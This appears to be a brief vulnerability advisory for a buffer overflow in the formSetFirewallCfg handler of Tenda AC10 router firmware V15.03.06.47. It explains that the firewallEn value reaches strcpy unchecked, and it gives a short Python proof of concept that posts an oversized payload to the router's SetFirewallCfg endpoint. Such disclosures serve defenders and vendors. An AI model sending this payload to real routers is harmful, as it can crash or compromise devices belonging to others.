# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/formSetFirewallCfg

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](12.png)

get value from firewallEn ,and call strcpy, cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/SetFirewallCfg"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'firewallEn': payload})
``` 
